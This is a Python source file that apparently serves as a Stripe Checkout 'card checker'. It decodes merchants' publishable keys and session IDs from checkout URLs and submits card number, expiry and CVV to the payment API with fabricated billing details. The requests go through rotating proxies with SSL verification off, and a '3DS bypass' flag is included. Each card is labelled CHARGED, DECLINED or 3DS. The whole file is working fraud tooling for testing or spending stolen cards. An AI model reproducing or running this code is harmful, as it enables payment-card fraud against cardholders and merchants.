import re
import time
import aiohttp
import base64
import asyncio
from urllib.parse import unquote, quote

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

_v2_session = None

async def get_v2_session():
    global _v2_session
    if _v2_session is None or _v2_session.closed:
        _v2_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=25, connect=8)
        )
    return _v2_session

def extract_checkout_url(text):
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip('.,;:')
    return None

def decode_pk_from_url(url):
    result = {"pk": None, "cs": None, "site": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' not in url:
            return result
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
    except:
        pass
    return result

def parse_proxy_format(proxy_str):
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None}
    try:
        if '@' in proxy_str:
            auth_part, host_part = proxy_str.rsplit('@', 1)
            if ':' in auth_part:
                result["user"], result["password"] = auth_part.split(':', 1)
            if ':' in host_part:
                result["host"], port_str = host_part.rsplit(':', 1)
                result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    return result

def get_proxy_url(proxy_str):
    if not proxy_str:
        return None
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            user = quote(str(parsed["user"]), safe='')
            pwd = quote(str(parsed["password"]), safe='')
            return f"http://{user}:{pwd}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None

def get_currency_symbol(currency):
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

async def v2_init_checkout(url, proxy_str=None):
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_email": None,
        "success_url": None,
        "cards_accepted": None,
        "init_data": None,
        "error": None,
        "time": 0
    }

    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")

        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        proxy_url = get_proxy_url(proxy_str) if proxy_str else None
        connector = aiohttp.TCPConnector(limit=100, ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=20)) as s:
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            kwargs = {"headers": HEADERS, "data": body}
            if proxy_url:
                kwargs["proxy"] = proxy_url

            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                **kwargs
            ) as r:
                init_data = await r.json()

            if "error" in init_data:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
                result["time"] = round(time.perf_counter() - start, 2)
                return result

            result["init_data"] = init_data

            acc = init_data.get("account_settings", {})
            result["merchant"] = acc.get("display_name") or acc.get("business_name")
            result["country"] = acc.get("country")

            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                result["price"] = lig.get("total", 0) / 100
                result["currency"] = lig.get("currency", "").upper()
                if lig.get("line_items"):
                    items = lig["line_items"]
                    sym = get_currency_symbol(result["currency"])
                    parts = []
                    for item in items:
                        qty = item.get("quantity", 1)
                        name = item.get("name", "Product")
                        amt = item.get("amount", 0) / 100
                        parts.append(f"{qty}x {name} ({sym}{amt:.2f})")
                    result["product"] = ", ".join(parts)
            elif inv:
                result["price"] = inv.get("total", 0) / 100
                result["currency"] = inv.get("currency", "").upper()

            mode = init_data.get("mode", "")
            result["mode"] = mode.upper() if mode else ("SUBSCRIPTION" if init_data.get("subscription") else "PAYMENT")

            result["customer_email"] = init_data.get("customer_email")
            result["success_url"] = init_data.get("success_url")

            pm_types = init_data.get("payment_method_types") or []
            if pm_types:
                result["cards_accepted"] = ", ".join([t.upper() for t in pm_types])

    except Exception as e:
        result["error"] = str(e)[:80]

    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def v2_charge_card(card, checkout_data, proxy_str=None, bypass_3ds=False, max_retries=2):
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0
    }

    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")

    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    for attempt in range(max_retries + 1):
        try:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=25)) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)

                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"

                pm_body = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                    f"&card[exp_month]={card['month']}&card[exp_year]={card['year']}"
                    f"&billing_details[name]={name}&billing_details[email]={email}"
                    f"&billing_details[address][country]={country}"
                    f"&billing_details[address][line1]={line1}"
                    f"&billing_details[address][city]={city}"
                    f"&billing_details[address][postal_code]={zip_code}"
                    f"&billing_details[address][state]={state}&key={pk}"
                )

                pm_kwargs = {"headers": HEADERS, "data": pm_body}
                if proxy_url:
                    pm_kwargs["proxy"] = proxy_url

                async with s.post("https://api.stripe.com/v1/payment_methods", **pm_kwargs) as r:
                    pm = await r.json()

                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower():
                        result["status"] = "NOT SUPPORTED"
                        result["response"] = "Checkout not supported"
                    else:
                        result["status"] = "DECLINED"
                        result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM ID"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                conf_body = (
                    f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                )

                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"

                conf_kwargs = {"headers": HEADERS, "data": conf_body}
                if proxy_url:
                    conf_kwargs["proxy"] = proxy_url

                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", **conf_kwargs) as r:
                    conf = await r.json()

                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg_text = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg_text}" if dc else msg_text
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st in ["succeeded", "requires_capture"]:
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                        # Extract receipt_url from payment_intent if available
                        receipt_url = pi.get("receipt_url") or conf.get("receipt_url")
                        if not receipt_url:
                            success_url = checkout_data.get("success_url", "")
                            if success_url:
                                receipt_url = success_url.replace("{CHECKOUT_SESSION_ID}", cs).replace("&amp;", "&")
                        result["receipt_url"] = receipt_url
                    elif st == "requires_action":
                        result["status"] = "3DS"
                        result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e)
            if attempt < max_retries and any(k in err_str.lower() for k in ["disconnect", "timeout", "connection"]):
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result

async def v2_check_active(pk, cs, proxy_str=None):
    try:
        proxy_url = get_proxy_url(proxy_str) if proxy_str else None
        connector = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5)) as s:
            body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            kwargs = {"headers": HEADERS, "data": body}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/init", **kwargs) as r:
                data = await r.json()
                return "error" not in data
    except:
        return False
